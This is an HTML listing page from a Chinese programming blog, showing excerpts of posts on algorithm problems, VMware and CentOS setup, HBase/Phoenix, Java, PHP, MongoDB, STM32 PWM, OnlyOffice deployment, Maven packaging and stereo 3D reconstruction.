<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69142ce9708fd707c15215d539959f8c/" rel="bookmark">
			rfc5245中文翻译（持续更新中）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 介绍
2 ICE整体视图
2.1 收集candidate
2.2 连通性检查
2.3 Candidate排序
2.4 Frozen candidate
2.5 检查机制的安全考虑
2.6 ICE判定
2.7 Lite实现
3 术语
4 发送初始OFFER
4.1 Full实现的要求
4.1.1 收集candidate
4.1.2 设置candidate优先级
4.1.3 剔除冗余candidate
4.1.4 选择默认candidate
4.2 Lite实现的要求
4.3 SDP编码
5 接收初始OFFER
5.1 验证ICE是否支持
5.2 角色判定
5.3 收集candidate
5.4 设置candidate优先级
5.5 选择默认candidate
5.6 SDP编码
5.7 构造check list
5.7.1 构造candidate pair
5.7.2 计算pair的优先级和排序
5.7.3 修剪这些pair
5.7.4 计算状态
5.8 调度检测
6 接收初始ANSWER
6.1 验证ICE是否支持
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69142ce9708fd707c15215d539959f8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/059d2d973d21a6b244e17994f8423fcf/" rel="bookmark">
			【POJ 3468】A Simple Problem with Integers【树状数组】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目大意： 题目大意：
题目链接：http://poj.org/problem?id=3468
给出一个初始数列，有两种操作：
Q x y Q\ x\ y Q x y，输出这个数列 x x x到 y y y之间的数字和。 C x y z C\ x\ y\ z C x y z，将这个数列的 x x x到 y y y之间的数加上 z z z。 思路： 此题线段树也可做：https://blog.csdn.net/SSL_ZYC/article/details/81907648
树状数组本来只支持单点修改和单点查询。可是如果加上前缀和就有了区间修改的能力。那么应该怎样完成区间查询呢？
设 s u m sum sum数组为前缀和，那么由于 ∑ i = 1 x s u m [ i ] = a [ x ] \sum^{x}_{i=1}sum[i]=a[x] ∑i=1x​sum[i]=a[x]，所以就有 ∑ i = 1 x a [ i ] = ∑ i = 1 x ∑ j = 1 i b [ j ] \sum^{x}_{i=1}a[i]=\sum^{x}_{i=1} \sum^{i}_{j=1}b[j] ∑i=1x​a[i]=∑i=1x​∑j=1i​b[j]。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/059d2d973d21a6b244e17994f8423fcf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43d863f8a6411f33e93f4ee18d35af45/" rel="bookmark">
			简历项目（二）——复杂工况下的字符分割与识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 项目背景：在钢坯生产线自动拍照，实现自动识别，输出对应的钢坯号。 项目识别：钢坯号直接印在钢坯上，根据钢坯的凹陷呈现出相应的字符，增加了检测的难度，背景与钢坯字符几乎一致。 项目工作： （1）图像预处理：对采集的彩色图像转成灰度图，然后进行降噪处理，项目采用的是中值滤波，使图像清晰。 （2）字符定位与分割：通过对整个图像进行方差梯度，进行边缘检测确定字符区域，通过梯度处理后使字符与背景边界更为明显，分割时采用垂直投影和固定边界对完整的钢坯序列进行分割。 （3）字符识别：构造字符集，确定卷积核，提取特征，识别；具体过程类似于MINST手写字体识别。 项目涉及的相关知识点 1.图像预处理 2。图像分割 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ed8db3f1405033ec9404146624b1545/" rel="bookmark">
			VMware虚拟机黑屏解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信VM( VMware Workstation)虚拟机很多人都在用，不知道有没有人跟我一样也遇到过VM虚拟机黑屏现象
具体表现为：虚拟机可以正常开机，但是屏幕不显示，处于黑屏状态。
之前有一次好像是因为win10更新，然后更新以后发现虚拟机开机以后能听见开机以后的开机音效，但是屏幕始终处于黑屏
昨天，因为一次电脑重启，虚拟机又出现了相同的问题
所以，VM虚拟机可以正常开机，但是黑屏不显示怎么解决呢？
1.管理员身份运行cmd（右键-&gt;以管理员身份运行）
2.修复LSP,输入 “netsh winsock reset”然后回车
关于为何VM虚拟机黑屏需要修复LSP来解决，有兴趣的朋友可以在本文结尾链接跳转至另一篇文章查看原因
3.重启电脑即可
关于修复LSP解决vm黑屏问题： https://blog.csdn.net/edc370/article/details/81912952
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/995fb29d927f5d19b0eb4041edccfd45/" rel="bookmark">
			hbase表映射Phoenix视图,  基于视图的二级索引是否实时更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. hbase shell 创建表 create 'MY_TABLE', 'CF1','CF2'
添加数据 put 'MY_TABLE','1' ,'CF1:V1', 'uwo1'
put 'MY_TABLE','1' ,'CF2:V2', '1'
put 'MY_TABLE','1' ,'CF1:V3', '10'
put 'MY_TABLE','2' ,'CF1:V1', 'uwo2'
put 'MY_TABLE','2' ,'CF2:V2', '2'
put 'MY_TABLE','2' ,'CF1:V3', '20'
查询hbase表数据 2. phoenix shell 创建视图, 视图名要和hbase表名一致 create view MY_TABLE (PK varchar primary key, CF1.V1 varchar, CF2.V2 varchar, CF1.V3 varchar);
创建二级索引 create index my_index2 on MY_TABLE(V1) include(v2);
查询视图 select * from MY_TABLE;
查询二级索引 select * from my_index2;
以上一切正常, 下面往hbase表中添加数据, 观察view和索引的情况
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/995fb29d927f5d19b0eb4041edccfd45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a161374bd6b4ced30e28b9f90b24e1ac/" rel="bookmark">
			在VMware workstation 14中安装CentOS 7 步骤笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在这里我们需要准备的安装包有：
VMware Workstation Pro 14 下载官网：https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html CentOS 7 64位 下载官网：https://www.centos.org/download/ CentOS系统是Linux众多版本比较好用的版本之一
废话不多说，下面是安装CentOS 7 的详细步骤
1，我们打开VMware Workstation，然后在“文件”中“新建虚拟机”。
2，我们选择自定义安装，然后 下一步。
3，默认就好，然后下一步。
4，这里我们选择 “稍后安装操作系统”，然后下一步。
5，我们选择安装 Linux 版本选择CentOS 7 64 位
6，我们可以修改安装的路径，虚拟机的名字也可以修改。
7.默认就行了，不过你也可以根据需求修改，linux占用资源非常少的。
8.这里你也可以根据自己要求修改，在这里我选择1G内存
9.这里我们选择第二个，这样我们在Linux虚拟机中也可以上网了
10.默认就行，然后下一步。
11.这里选择磁盘类型，选择SCSI（默认）就行。
12.在这里我们选择第一个，创建新虚拟磁盘。
13.选择第三个，磁盘大小可以自己修改。
14，默认就行了
15.这里我们自定义硬盘。
16.在这里我们只要修改cd/dvd这个就行了，其他默认就可以了，然后关闭，完成。
17，下面我们就开启虚拟机。
18.经过较长时间的等待，我们开始CentOS 7的安装了，这里我选择中文方式安装。
19.这里我们选择下安装的软件，选择有图形化的。
20.以下是给配置分区。
选择我要自定义分区，然后完成。
21.配置网络
22.开始安装了。
23,设置root密码
24.创建一个普通用户。用户名和密码随便自己输入就行了，密码需要记住的。由于密码设置太短了，需要多点几下“完成”。
25，安装了好久好久，最后还是成功了，就可以开始使用Linux了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c673b693666a363c7f6a88ab549998e1/" rel="bookmark">
			JAVA获取对象内存地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了观察JVM的GC过程中各个对象所处的位置，需要观察JVM各个对象的内存地址，与年轻代与老年代进行比对，确定对象位置。
package com.memory.tools; import sun.misc.Unsafe; import java.lang.reflect.Field; public class AddressPrint { private static Unsafe unsafe; static { try { Field field = Unsafe.class.getDeclaredField("theUnsafe"); field.setAccessible(true); unsafe = (Unsafe)field.get(null); } catch (Exception e) { e.printStackTrace(); } } public static String addressOf(Object o) throws Exception { Object[] array = new Object[] {o}; long baseOffset = unsafe.arrayBaseOffset(Object[].class); int addressSize = unsafe.addressSize(); long objectAddress; switch (addressSize) { case 4: objectAddress = unsafe.getInt(array, baseOffset); break; case 8: objectAddress = unsafe.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c673b693666a363c7f6a88ab549998e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/700701444be6f77f70107e933fccb7b1/" rel="bookmark">
			SPL迭代器之ArrayIterator
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		迭代器：通过某种统一的方式遍历链表或者数组中的元素的过程叫做迭代遍历，而这种统一的遍历工具称为迭代器。
//SPL迭代器之ArrayIterator
$fruits = array(
"apple" =&gt; "apple value",
"orange" =&gt; "orange value",
"grape" =&gt; "grape value",
"plum" =&gt; "plum value"
);
print_r($fruits);
echo "**** use fruits directly *****" . "\n";
foreach ($fruits as $key =&gt; $value) {
echo $key . ":" . $value . "\n";
}
//使用ArrayIterator遍历数组
$obj = new ArrayObject($fruits);
$it = $obj-&gt;getIterator();
echo "**** use ArrayIterator in foreach *****" . "\n";
foreach ($it as $key =&gt; $value) {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/700701444be6f77f70107e933fccb7b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4125cf30ed46da0395a3e3def1472a0/" rel="bookmark">
			mongoose常用方法（查询篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		条件 $or 或关系
$nor 或关系取反
$gt 大于
$gte 大于等于
$lt 小于
$lte 小于等于
$ne 不等于
$in 在多个值范围内
$nin 不在多个值范围内
$all 匹配数组中多个值
$regex 正则，用于模糊查询
$size 匹配数组大小
$maxDistance 范围查询，距离（基于LBS）
$mod　取模运算
$near 邻域查询，查询附近的位置（基于LBS）
$exists 字段是否存在
$elemMatch 匹配内数组内的元素
$within 范围查询（基于LBS）
$box 范围查询，矩形范围（基于LBS）
$center 范围醒询，圆形范围（基于LBS）
$centerSphere 范围查询，球形范围（基于LBS）
$slice 查询字段集合中的元素（比如从第几个之后，第N到第M个元素
# find() ## find({$where : "this.name == 'a'"})
Model.find(conditions, [fields], [options], [callback]) 注：conditions 查询条件、fields 想要查询的字段、options 、callback 回调函数
示例： 查询用户表下面名字为张三的从第二条开始的后两条文档且只需按时姓名、性别、居住地址、创建时间信息并按创建时间倒叙显示
//对象写法 userModel.find({'name':'张三'},{'name':1,'sex':1,'region':1,'createBy':1,'_id':0},{ limit:2, skip:1, sort:'-createBy.createTime'}) //链式写法 userModel.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4125cf30ed46da0395a3e3def1472a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e86052b5752b394183baeb3939b5ec11/" rel="bookmark">
			windows如何删除管理员权限的文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.选中文件夹，右键属性
2.点击安全一栏，可以看到当前的文件权限为Authenticated Users所有，点击高级
更改为用户账号为用户账号
比如我的用户名为kang,输入后点击'检查名称'
然后点击确定
按下图勾选，最后点击确定，就可以删除了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c89f3bea8176bdf27592f9bfdb3940df/" rel="bookmark">
			在 PyCharm 上配置 PySpark
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、在pycharm上配置pyspark https://blog.csdn.net/rifengxxc/article/details/74503119
2、使用PyCharm配置Spark的Python开发环境 https://blog.csdn.net/ydc321/article/details/78903240
3、使用PyCharm配置Spark的Python开发环境 http://blog.tomgou.xyz/shi-yong-pycharmpei-zhi-sparkde-pythonkai-fa-huan-jing.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5aea33fe7972f66b82d9a428b7ed0b58/" rel="bookmark">
			STM32之TIM   舵机控制PWM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
大概步骤
定时器介绍
输入通道
输入滤波器和边沿检测器
捕获通道
定时器初始化结构体详解
1. TIM_TimeBaseInitTypeDef
定时器基本初始化结构体
TIM_OCInitTypeDef
定时器比较输出初始化结构体
3. TIM_ICInitTypeDef
4. TIM_BDTRInitTypeDef
PWM 互补输出实验
使用STM32控制单个舵机
PWM 输出配置步骤（通过 TIM1_CH1 输出PWM 来控制 舵机？）
大概步骤 1、频率的计算为： F = TIM_CLK/{(ARR+1)*(PSC+1)}
2、如果有中断函数就要配置中断通道中之类的
3、配置相应TIM通道的GPIO复用引脚
4、时基结构体配置
5、输出比较结构体配置（pwm输出时使用）
6、输出使能
普通定时器与高级定时器 ///*
// * 注意：TIM_TimeBaseInitTypeDef结构体里面有5个成员，TIM6和TIM7的寄存器里面只有
// * TIM_Prescaler和TIM_Period，所以使用TIM6和TIM7的时候只需初始化这两个成员即可，
// * 另外三个成员是通用定时器和高级定时器才有.
// *-----------------------------------------------------------------------------
// *typedef struct
// *{ TIM_Prescaler 都有
// * TIM_CounterMode TIMx,x[6,7]没有，其他都有
// * TIM_Period 都有
// * TIM_ClockDivision TIMx,x[6,7]没有，其他都有
// * TIM_RepetitionCounter TIMx,x[1,8,15,16,17]才有
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5aea33fe7972f66b82d9a428b7ed0b58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47489c8b40434972a2292e5a8f05fb2a/" rel="bookmark">
			ubuntu16.04上onlyoffice环境搭建以及常见错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		非docker方式部署onlyoffice
onlyoffice的官网https://www.onlyoffice.com/
https://helpcenter.onlyoffice.com/server/linux/document/linux-installation.aspx
现在的onlyoffice都是docker拉起的，搭建非常简单，不过为了更深入的了解和后期方便修改网站，尝试手动部署也是个不错的选择
官网上有centos搭建文档，但是在centos上部署onlyoffice会无法打开.doc .ppt .xls后缀名的文件 因为centos系统的lib版本库和onlyoffice不兼容，在运行的时候onlyoffice找不到合适的lib版本库时部分 服务就会挂掉
官网虽然也有ubuntu的安装说明，本人也尝试搭建过，但是会出现很多问题，无法打开部分文件 查阅资料和分析后发现ubuntu16.04是最适合onlyoffice的操作系统
.
系统要求 ubuntu16.04 中央处理器 双核2 GHz或更高 内存 2 GB或更多 硬盘 至少40 GB的可用空间
.
https://github.com/ONLYOFFICE/Docker-DocumentServer github上先下载安装包，wget或者上传到服务器上均可，存放路径随意
我是将之前docker方式部署服务器里的 /app 这个目录copy到 新的ubuntu服务器的根下
然后安装步骤
直接执行 LANG=en_US.UTF-8 LANGUAGE=en_US:en LC_ALL=en_US.UTF-8 DEBIAN_FRONTEND=noninteractive echo "#!/bin/sh\nexit 0" &gt; /usr/sbin/policy-rc.d &amp;&amp; \ apt-get -y update &amp;&amp; \ apt-get -yq install wget apt-transport-https curl locales &amp;&amp; \ apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 0x8320ca65cb2de8e5 &amp;&amp; \ locale-gen en_US.UTF-8 &amp;&amp; \ curl -sL https://deb.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47489c8b40434972a2292e5a8f05fb2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5e9d1fa7c291b3d05f65142ed281d2b/" rel="bookmark">
			Maven构建可执行的jar包(包含依赖jar包)之maven-assembly-plugin介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1， 简介 先看官方文档：http://maven.apache.org/plugins/maven-assembly-plugin/index.html maven-assembly-plugin可以将依赖的第三方jar包打包到jar中，这样方便我们发布可执行的jar包。
2， 用法 用法部分的官方文档：http://maven.apache.org/plugins/maven-assembly-plugin/index.html
&lt;plugin&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assembly&lt;/id&gt; &lt;!-- this is used for inheritance merges --&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;!-- bind to the packaging phase --&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; 3，具体示例 具体工程代码在这里。欢迎fork加星，谢谢！
我的pom文件如下
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.yq&lt;/groupId&gt; &lt;artifactId&gt;MavenPluginDemo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.0.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5e9d1fa7c291b3d05f65142ed281d2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb88ee21d6af73142198ccbe73cc8977/" rel="bookmark">
			Linux L2tp auto install script
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		github 连接
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/659191d75340908531abb73e7cf8b855/" rel="bookmark">
			LeetCode 83. 删除排序链表中的重复元素(C&#43;&#43;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目： 给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。 重点内容
输入: 1-&gt;1-&gt;2 输出: 1-&gt;2 示例 2:
输入: 1-&gt;1-&gt;2-&gt;3-&gt;3 输出: 1-&gt;2-&gt;3 思路： 这道题比较简单，就是不断判断当前节点的下一个节点的val是否与当前节点的val相同，相同的话当前节点的next指针指向下一节点的下一个节点，否则当前节点后移一个节点。
/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { ListNode* cur = head; while(cur != NULL){ ListNode* rear = cur-&gt;next; if(rear == NULL) return head; if(cur-&gt;val == rear-&gt;val) cur-&gt;next = rear-&gt;next; else cur = cur-&gt;next; } return head; } }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e3d6037bb78ebd07f22701ef57b2192/" rel="bookmark">
			java.util.Objects.isNull vs object == null 之Objects类的介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java7引入了java.util.Objects类，Objects提供了很多工具类方法，其中包括isNull方法（Java8引入了isNull方法），那么java.util.Objects.isNull 与 object== null有何区别？为什么会引入java.util.Objects.isNull方法？
1， 直接对比源代码 public static boolean isNull(Object obj) { return obj == null; } 从源码上看，两者是一致的。
参考：https://docs.oracle.com/javase/7/docs/api/java/util/Objects.html https://docs.oracle.com/javase/8/docs/api/java/util/Objects.html
2， 存在的原因 既然一样，为什么需要isNull方法了？ 我们可以发现java docs上注释了： 之所以有isNull方法是因为* @apiNote This method exists to be used as a * {@link java.util.function.Predicate}, {@code filter(Objects::isNull)} Java8中引入了lambda，因此出现很多这样filter(Objects::isNull)这样的写法，显然比filter(x -&gt; x == null). 方法更直观一些。
3，Objects还有哪些方法？ 我们可以发现Objects提供了很多静态工具类。下面简要介绍其中几个
方法说明compare(T a, T b, Comparator c)比较两个对象，如果两个对象完全相同，返回0， 否则返回c.compare(a, b)equals(Object a, Object b)如果两个参数彼此相等，返回true，否则falsetoString(Object o)如果参数非null，返回参数的toString结果。如果参数为null，返回字符串”null” 其余方法参考https://docs.oracle.com/javase/8/docs/api/java/util/Objects.html
4, 示例用法 代码非常简单，直接使用 Objects.isNull(xxx) 或者Objects::nonNull
package com.yq.helloworld; import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e3d6037bb78ebd07f22701ef57b2192/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d669ec17f8ee0f429f7931c5e031f83/" rel="bookmark">
			7. 反转整数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个 32 位有符号整数，将整数中的数字进行反转。
示例 1:
输入: 123 输出: 321 示例 2:
输入: -123 输出: -321 示例 3:
输入: 120 输出: 21 注意:
假设我们的环境只能存储 32 位有符号整数，其数值范围是 [−231, 231 − 1]。根据这个假设，如果反转后的整数溢出，则返回 0。
public class Solution { public int Reverse(int x) { if (x == 0) { return 0; } bool flag = false; if (x &lt; 0) { x = -x; flag = true; } while (x % 10 == 0) { x = x / 10; } double temp = 0; while (x !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d669ec17f8ee0f429f7931c5e031f83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77256a3ded678679c40d1206be739710/" rel="bookmark">
			便利店
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 天宝来到便利店想买些饮料。便利店有各种型号的瓶装饮料售卖，不同型号的饮料卖不同的价格。1瓶0.25升的卖A元，1瓶0.5升的饮料卖B元，1瓶1升的卖C元，1瓶2升的卖D元。便利店里每种饮料都是无限供应。
天宝要买N升的饮料，最少需要花多少钱呢？聪明的你写个程序帮她算算吧。
已知 1） 1≤A,B,C,D≤108 ，1≤N≤109 2） 输入的数据都是整数 输入 输入数据按照下面格式
A B C D
N
输出 输出天宝要买N升的饮料所需要花的钱最小值。
样例输入 20 30 70 90 3 样例输出 150 提示 买1瓶2升的饮料和2瓶0.5升的饮料。 这样正好可以买到3升饮料，花费是 90+30+30=150 元。
#include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; struct bi { long long m,xjb; int s; }; bool cmp(bi a,bi b) { return a.xjb&lt;b.xjb; } int main() { bi a[5]={0}; for(int i=1;i&lt;=4;i++) cin&gt;&gt;a[i].m; long long n; cin&gt;&gt;n; n*=100; a[1].s=25;a[2].s=50; a[3].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77256a3ded678679c40d1206be739710/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48ceda5bc7c96d031d00a48982571ccc/" rel="bookmark">
			CodeForces - 803C Maximal GCD（构造 &#43; 思维！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		You are given positive integer number n. You should create such strictly increasingsequence of k positive numbers a1, a2, ..., ak, that their sum is equal to n and greatest common divisor is maximal.
Greatest common divisor of sequence is maximum of such numbers that every element of sequence is divisible by them.
If there is no possible sequence then output -1.
Input
The first line consists of two numbers n and k (1 ≤ n, k ≤ 1010).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48ceda5bc7c96d031d00a48982571ccc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad7d4c473bd84b6ffde48e550fc3cec4/" rel="bookmark">
			双目三维重建和误差估计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		应用场景：
双目测距的精度和基线长度（两台相机之间的距离）有关，两台相机布放的距离越远，测距精度越高。
但问题是：往往在实际应用中，相机的布放空间是有限的，最多也只有几米或几十米的基线长度，这就导致双目测距在远距离条件下的精度大打折扣。
所以，双目测距一般用于近距离的高精度测量，而远距离测距一般用脉冲式的激光测距机。
图像测量方法的优点是近距离精度高，但是图像质量受外界光照等条件制约太大，且由于相机性能往往不够稳定，加上算法相对复杂些，这些都会限制它的应用。
在相机标定后，我们就可以用得到的相机内参矩阵、畸变矩阵、两相机相对位置变换矩阵进行三维重建了。用数学方法进行空间变换很容易得到图像坐标（在两相机拍摄的同一帧图像上对应点坐标）与三维坐标（相对某一相机建模的三维坐标）之间的关系，原理参考https://blog.csdn.net/tiemaxiaosu/article/details/51734667#commentsedit
用 OpenCV goodFeaturesToTrack()函数得到角点坐标，取得左右相机同一帧图像对应点AB的像素坐标。
再计算得到空间两点AB双目三维空间计算距离和实际测量距离，得到三维建模测距误差，三维建模代码如下：
Point2f xyz2uv(Point3f worldPoint,float intrinsic[3][3],float translation[1][3],float rotation[3][3]); Point3f uv2xyz(Point2f uvLeft,Point2f uvRight); //左相机内参数矩阵 float leftIntrinsic[3][3] = {294.0911635717881,	0,	310.6171586702577, 0,	295.3905526589596,	256.4320568139868, 0,	0,	1}; //左相机旋转矩阵 float leftRotation[3][3] = {1,	0,	0, 0,	1,	0, 0,	0,	1}; //左相机平移向量 float leftTranslation[1][3] = {0, 0, 0}; //右相机内参数矩阵 float rightIntrinsic[3][3] = {293.27225104276044,0,335.4364278875495, 0, 295.1891754871827, 263.677364491931, 0,	0,	1}; //右相机旋转矩阵 float rightRotation[3][3] = {0.9997690293617348,-0.015539793483491028,0.014845967384545062, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad7d4c473bd84b6ffde48e550fc3cec4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88b025bfeb35e9deb3dea69822044f4b/" rel="bookmark">
			VS2017如何创建c语言项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.启动VS2017，左上角点“文件”→→→新建”→→→“项目” 或者用快捷键“Crtl+shift+N” 2.选择“Windows桌面”→→→“Windows桌面向导”，名称部分自己改 3.弹出对话框后，在“空项目”前打对勾，再点“确定” 4.右击“源文件” 5.点击“添加”→→→“新建项” 6.选择“C++文件（.cpp）”，把文件名改成自己想要的，后缀改成“.c”,因为我们要创建C语言项目，最后点”添加“ 7.得到的界面是这样的 8.输入代码 9.按”F5”进行调试 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b48093e9ea0e1a4dcbd559bea26d0c20/" rel="bookmark">
			用起泡法对10个数由小到大排序.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：用起泡法对10个数由小到大排序. 即将相邻两个数比较,将小的调到前头.
.M文件：
function f=funn(a) n=length(a); for i=1:n-1 if a(i+1)&lt;=a(i) temp1=a(i); a(i)=a(i+1); a(i+1)=temp1; end for j=1:n-1 if a(j+1)&lt;=a(j) temp2=a(j); a(j)=a(j+1); a(j+1)=temp2; end end end f=a; 运行结果：
&gt;&gt; a=[7 2 1 0 9 4 5 -3 8 6]; &gt;&gt; funn(a) ans = -3 0 1 2 4 5 6 7 8 9 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
